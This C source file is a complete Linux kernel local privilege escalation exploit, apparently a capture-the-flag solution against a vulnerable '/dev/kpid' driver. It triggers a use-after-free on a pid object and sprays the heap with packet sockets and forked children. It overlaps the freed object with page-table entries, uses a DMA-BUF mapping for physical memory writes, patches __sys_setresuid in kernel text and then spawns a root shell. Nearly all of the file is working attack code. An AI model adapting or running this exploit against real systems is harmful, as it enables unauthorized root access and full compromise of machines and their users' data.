#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h> 
#include <linux/bpf.h>
#include <errno.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/resource.h>
#include <sys/un.h>
#include <linux/membarrier.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define o(x) (kbase + x)

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}


void bind_cpu(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}
int fd;
void my_fork(){
    ioctl(fd, 0x47001, 0);
}
void my_put(){
    logd("my_put");
    ioctl(fd, 0x69003, 0);
}
void my_leak(unsigned int *p){
    ioctl(fd, 0x58002, p);
}
int can_start, put_done, leak_done, nr;
void wait_and_su() {
    while(!can_start){
        ;
    }
    logd("spraying su cred");
    system("/bin/ls");
    
    while (1)
    {
        sleep(1);
    }
    
}
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

/**
 * III -  pgv pages sprayer related 
 * not that we should create two process:
 * - the parent is the one to send cmd and get root
 * - the child creates an isolate userspace by calling unshare_setup(),
 *      receiving cmd from parent and operates it only
 */
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    usleep(10000);

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    
    /* child process for pages spray */
    if (!fork()) {
        spray_cmd_handler();
    }
}

/**
 * IV - config for page-level heap spray and heap fengshui
 */
#define PIPE_SPRAY_NUM 200

#define PGV_1PAGE_SPRAY_NUM 0x20

#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
#define PGV_4PAGES_SPRAY_NUM 0x40

#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
#define PGV_8PAGES_SPRAY_NUM 0x40

int pgv_1page_start_idx = 0;
int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;

/* spray pages in different size for various usages */
void prepare_pgv_pages(void)
{
    /**
     * We want a more clear and continuous memory there, which require us to 
     * make the noise less in allocating order-3 pages.
     * So we pre-allocate the pages for those noisy objects there.
     */
    puts("[*] spray pgv order-0 pages...");
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        if (alloc_page(i, 0x1000, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("[*] spray pgv order-2 pages...");
    for (int i = 0; i < PGV_4PAGES_SPRAY_NUM; i++) {
        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    /* spray 8 pages for page-level heap fengshui */
    puts("[*] spray pgv order-3 pages...");
    for (int i = 0; i < PGV_8PAGES_SPRAY_NUM; i++) {
        /* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/
        if (i % 19 == 0) {
            free_page(pgv_4pages_start_idx++);
        }

        /* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */
        if (i % 21 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        /* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/
        if (i % 512 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("");
}

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

static __always_inline synchronize_rcu(void)
{
	if (syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1) < 0) {
		perror("rcu membarrier");
	}
}

typedef unsigned long long u64;
typedef unsigned int u32;
struct dma_heap_allocation_data {
  u64 len;
  u32 fd;
  u32 fd_flags;
  u64 heap_flags;
};

struct sockaddr_un unix_addr = {
  .sun_family = AF_UNIX,
  .sun_path = "/tmp/exploitsocket"
};
/*
 * Add @count to a struct pid by connecting @count times
 * to a socket on which the owner of that pid called listen().
 * This lets us increment the refcount of a pid even after the
 * task is already gone.
 */
void add_to_refcount(int count, int listensock) {
  for (int i=0; i<count; i++) {
    // logd("Adding to refcount: %d", i);
    int refsock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
    SYSCHK(connect(refsock, (struct sockaddr *)&unix_addr, sizeof(unix_addr)));
    SYSCHK(accept(listensock, NULL, NULL) == -1);
  }
}

#define STARTUP_64 (0xffffffff81000000UL)
#define __SYS_SETRESUID_OFF (0xffffffff81096ac0 - STARTUP_64)           // __sys_setresuid -- 0xffffffff81096ac0
#define PATCH_JNE_OFFSET (0xffffffff81096bfd + 1 - STARTUP_64 - __SYS_SETRESUID_OFF) // je: 0x0f, 0x84 

#define obj_per_page 32 // 0x1000/0x80
#define N_PADDINGS (obj_per_page * 6)
#define N_PAGESPRAY (N_PADDINGS * 20 * 2)
#define pid_cpu_partial 0x8
#define N_CHILDS ((obj_per_page) * (pid_cpu_partial + 4))
#define DMA_HEAP_IOCTL_ALLOC 0xc0184800

size_t kbase;
char buf[0x2000];
int child_pid[N_CHILDS], sync_pipe[N_CHILDS][2];
void *page_spray[N_PAGESPRAY];

int main()
{
    saveStatus();
    bind_cpu(0);
    fd = open("/dev/kpid", O_RDONLY);
    if(fd < 0) perror("Error open");
    // Open DMA-BUF
    int dmafd = creat("/dev/dma_heap/system", O_RDWR);
    if (dmafd == -1) perror("/dev/dma_heap/system");

    struct rlimit rl;

    // 设置新的文件描述符限制
    rl.rlim_cur = 2048;
    rl.rlim_max = 2048;
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        perror("setrlimit");
        return 1;
    }

    /*
    * This socket will later be given a reference to the child's pid on listen().
    * Connecting to it will give the client an extra reference to the child's pid,
    * lifting the pid's refcount.
    * Unlike most other places that non-ephemerally increment pid refcounts, this
    * allows us to easily lift the refcount of a pid that is no longer associated
    * with any task.
    */
    int listensock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
    unlink(unix_addr.sun_path);
    SYSCHK(bind(listensock, (struct sockaddr *)&unix_addr, sizeof(unix_addr)));

    int victim_pipe[2][2], parent, victim_start;
    
    for (int i = 0; i < N_CHILDS; i++) {
        pipe(sync_pipe[i]);
    }
    pipe(victim_pipe[0]); // parent -> victim child
    pipe(victim_pipe[1]); // victim -> parent

    parent = getpid();
    logd("Start uid: %d, euid: %d, pid: %d", getuid(), geteuid(), parent);

    logd("Register SIGCHLD handler ...\n");
    struct sigaction act;
    act.sa_handler = SIG_IGN;
    sigemptyset(&act.sa_mask);
    act.sa_flags = SA_NOCLDWAIT;
    sigaction(SIGCHLD, &act, NULL);        // Register SIGCHLD handler

    logd("Fill up two pages");
    int cnt = 0;
    victim_start = obj_per_page * 2;
start_fork:
    while(cnt < victim_start){
        child_pid[cnt] = fork();
        if(child_pid[cnt] < 0){
            die("error fork");
        }
        if(child_pid[cnt]){
            sleep(0.02);
            cnt++;
            goto start_fork;
        }else{
            int index = cnt;
            char sync;
            read(sync_pipe[index][0], &sync, 1);
            if(sync == 'C'){
                exit(-1);
            }
        }
    }

    logd("fork victim pid");
    my_fork();
    if(getpid() == parent){
        int nr;
        my_leak(&nr);
        logd("parent: %d, nr: %d", getpid(), nr);

        logd("Trigger UAF");
        my_put();

        cnt = victim_start;
start_fork_2:
        while(cnt < N_CHILDS){
            child_pid[cnt] = fork();
            if(child_pid[cnt] < 0){
                die("error fork");
            }
            if(child_pid[cnt]){
                sleep(0.02);
                cnt++;
                goto start_fork_2;
            }else{
                int index = cnt;
                char sync;
                read(sync_pipe[index][0], &sync, 1);
                if(sync == 'C'){
                    exit(-1);
                }
                else if (sync == 'A') {
                    add_to_refcount(128, listensock);
                    while (1) sleep(1);
                }
                else if (sync == 'B') {
                    add_to_refcount(127, listensock);
                    while (1) sleep(1);
                }
            }
        }

        logi("Latest child pid is %d", child_pid[N_CHILDS - 1]);

        // Prepare pages (PTE not allocated at this moment)
        logd("Mmap page_spray");
        for (int i = 0; i < N_PAGESPRAY; i++) {
            page_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                                0x8000, PROT_READ|PROT_WRITE,
                                MAP_ANONYMOUS|MAP_SHARED, -1, 0);
            if (page_spray[i] == MAP_FAILED) die("mmap");
        }

        // In most cases, remain = 12 is completely enough to occupy the victim page with pte
        int remain = 12;

        // Just free these pid pages
        for (int i = 0; i < obj_per_page * 7 + remain; i++) {
            sleep(0.2); 
            if (i % obj_per_page == 0)
                logd("Child: %d, %d exit", i, child_pid[i]);
            write(sync_pipe[i][1], "C", 1);
        }

        synchronize_rcu();
        sleep(1);

        logd("debug");        
        getchar();

        // Overlap UAF pid with PTE
        logd("Allocating PTEs...");
        // Allocate many PTEs (1)
        int start = 0;
        #define STEP N_PADDINGS
        for(int i = obj_per_page * 7 + remain; i < obj_per_page * 8; i++){
            sleep(0.2);
            write(sync_pipe[i][1], "C", 1);
            synchronize_rcu();

            for (int i = start; i < start + STEP; i++)
                for (int j = 0; j < 8; j++)
                    *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
            start += STEP;
        }
        sleep(1);

        // Allocate DMA-BUF heap
        int dma_buf_fd = -1;
        struct dma_heap_allocation_data data;
        data.len = 0x1000;
        data.fd_flags = O_RDWR;
        data.heap_flags = 0;
        data.fd = 0;
        if (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &data) < 0)
            die("DMA_HEAP_IOCTL_ALLOC");
        logd("dma_buf_fd: %d", dma_buf_fd = data.fd);
        // Allocate many PTEs (2)
        for (int i = start; i < N_PAGESPRAY; i++)
            for (int j = 0; j < 8; j++)
                *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
        
        logd("Allocating PTEs Finish");

        // Modify PTE entry to overlap 2 physical pages
        logd("Parent %d wake child %d ...", getpid(), (nr + 1));
        write(victim_pipe[0][1], "C", 1);

        while (1) {
            char sync;
            read(victim_pipe[1][0], &sync, 1);
            if (sync == 'D') {
                break;
            }
        }

        logd("Parent: %d awake ...", getpid());
        sleep(1); 

        logd("debug");        
        getchar();

        start = obj_per_page * 8 ;

        write(sync_pipe[start++][1], "B", 1); // idk why ref+=1, so just add 127
        sleep(0.2);

        for(; start < obj_per_page * 9; start++) { // 0x1000/0x80 = 0x20; has add 128 before
            sleep(0.2);
            write(sync_pipe[start][1], "A", 1);
        }

        logd("Searching for overlapping page...");
        sleep(1);

        // Search for page that overlaps with other physical page
        void *evil = NULL;
        for (int i = 0; i < N_PAGESPRAY; i++) {
                // We wrote 'A' but if it changes the PTE equals the next PTE
                if (*(char*)(page_spray[i]) != 'A') { // 0x0: refcount_t count;
                        evil = page_spray[i];
                        logd("Found overlapping page: %p", evil);
                        break;
                }
        }
        if (evil == NULL) die("target not found :(");
        logd("[+] Remapping...");
        munmap(evil, 0x1000);
        void *dmabuf = mmap(evil, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
        *(char*)dmabuf = '0';
        logd("debug");
        getchar(); 
        /**
         * Get physical AAR/AAW
         */
        // Corrupt physical address of DMA-BUF
        for (; start < obj_per_page * 10; start++){
            sleep(0.2);
            write(sync_pipe[start][1], "A", 1);
        }
        sleep(1); // must
        logi("[+] DMA-BUF now points to PTE: 0x%016lx", *(size_t*)dmabuf);

        // Leak kernel physical base
        char *wwwbuf = NULL;
        *(size_t*)dmabuf = 0x800000000009c067;

        for (int i = 0; i < N_PAGESPRAY; i++) {
            if (page_spray[i] == evil) 
                continue;
            if (*(size_t*)page_spray[i] > 0xffff) {
                wwwbuf = page_spray[i];
                logd("Found victim page table: %p", wwwbuf);
                break;
            }
        }
        size_t phys_base = ((*(size_t*)wwwbuf) & ~0xfff) - 0x1c01000;
        logi("Physical kernel base address: 0x%016lx", phys_base);
        
        logd("Overwriting __sys_setresuid...");
        size_t phys_func = phys_base + __SYS_SETRESUID_OFF;
        *(size_t*)dmabuf = (phys_func & ~0xfff) | 0x8000000000000067;

        logd("Show __sys_setresuid...");
        wwwbuf[(__SYS_SETRESUID_OFF + PATCH_JNE_OFFSET) & 0xfff] = 0x85; // jne

        setresuid(0, 0, 0);
        system("/bin/sh");
        while(1) sleep(1);
    } 
    else {
        char sync;
        int victim_child = getpid();
        
        logi("victime child: %d sleep ... \n", victim_child);

        read(victim_pipe[0][0], &sync, 1);
        if (sync == 'C') {
                logi("victime child: %d awake to listen...", victim_child);

                SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
                /* create post-death-incrementable pid reference */
                SYSCHK(listen(listensock, 128 /*SOMAXCONN*/));

                write(victim_pipe[1][1], "D", 1);
                logd("victim child: %d sleep ...", victim_child);
                while (1) {
                        sleep(1);
                }
        }
    }
}
